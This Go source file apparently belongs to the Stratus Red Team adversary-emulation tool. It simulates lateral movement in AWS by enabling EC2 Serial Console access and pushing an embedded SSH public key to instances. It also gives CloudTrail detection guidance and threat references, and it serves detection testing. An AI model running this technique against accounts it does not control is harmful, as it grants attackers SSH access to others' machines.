package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2instanceconnect"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"time"
	"strings"
)

//go:embed my_key.pub
var publicSSHKey string

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.lateral-movement.ec2-serial-console-connect",
		FriendlyName: "Usage of EC2 Serial Console to push SSH public key",
		IsSlow:       true,
		Description: `
Simulates an attacker pushing an SSH public key to multiple EC2 instances through the EC2 Serial Console API. This allows anyone 
with the corresponding private key to connect directly to the systems via SSH.

Warm-up:

- Create multiple EC2 instances and a VPC (takes a few minutes).

Detonation:

- Adds a public SSH key to the EC2 instances using the Serial Console API for 60 seconds.

References:

- https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud
- https://fwdcloudsec.org/assets/presentations/2024/europe/sebastian-walla-cloud-conscious-tactics-techniques-and-procedures-an-overview.pdf
- https://unit42.paloaltonetworks.com/cloud-lateral-movement-techniques/
- https://unit42.paloaltonetworks.com/cloud-virtual-machine-attack-vectors/
`,
		Detection: `
Identify, through CloudTrail's <code>SendSerialConsoleSSHPublicKey</code> event, when a user is adding an SSH key to EC2 instances. Sample event:

` + codeBlock + `
{
  "eventSource": "ec2-instance-connect.amazonaws.com",
  "eventName": "SendSerialConsoleSSHPublicKey",
  "requestParameters": {
    "instanceId": "i-123456",
    "serialPort": 0,
    "sSHPublicKey": "ssh-ed25519 ..."
	"monitorMode": false
  }
}
` + codeBlock + `
`,
		Platform:                   stratus.AWS,
		PrerequisitesTerraformCode: tf,
		IsIdempotent:               true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.LateralMovement},
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())
	ec2instanceconnectClient := ec2instanceconnect.NewFromConfig(providers.AWS().GetConnection())
	instanceIDs := strings.Split(params["instance_ids"], ",")

	// Enable EC2 Serial Console access for the account
	_, err := ec2Client.EnableSerialConsoleAccess(context.Background(), &ec2.EnableSerialConsoleAccessInput{})
	if err != nil {
		return fmt.Errorf("failed to enable EC2 Serial Console access: %v", err)
	}
	log.Println("EC2 Serial Console access enabled for the account")

	// Ensure that Serial Console access is disabled at the end
	defer func() {
		_, err := ec2Client.DisableSerialConsoleAccess(context.Background(), &ec2.DisableSerialConsoleAccessInput{})
		if err != nil {
			log.Printf("Failed to disable EC2 Serial Console access: %v", err)
		} else {
			log.Println("EC2 Serial Console access disabled for the account")
		}
	}()

	for _, instanceID := range instanceIDs {
		cleanInstanceID := strings.Trim(instanceID, " \"\n\r")
		err := sendSerialConsoleSSHPublicKey(ec2instanceconnectClient, cleanInstanceID, publicSSHKey)
		if err != nil {
			if strings.Contains(err.Error(), "SerialConsoleSessionLimitExceededException") {
				log.Printf("Serial console session limit exceeded for instance %s. Retrying after waiting 60s...", cleanInstanceID)
				time.Sleep(60 * time.Second)
				err = sendSerialConsoleSSHPublicKey(ec2instanceconnectClient, cleanInstanceID, publicSSHKey)
			}
			if err != nil {
				return fmt.Errorf("failed to send SSH public key via serial console to instance %s: %v", cleanInstanceID, err)
			}
		}

		log.Printf("SSH public key successfully added to instance %s via serial console", cleanInstanceID)
	}

	return nil
}

func sendSerialConsoleSSHPublicKey(ec2instanceconnectClient *ec2instanceconnect.Client, instanceId, sshPublicKey string) error {
	_, err := ec2instanceconnectClient.SendSerialConsoleSSHPublicKey(context.Background(), &ec2instanceconnect.SendSerialConsoleSSHPublicKeyInput{
		InstanceId:   &instanceId,
		SSHPublicKey: &sshPublicKey,
	})

	return err
}
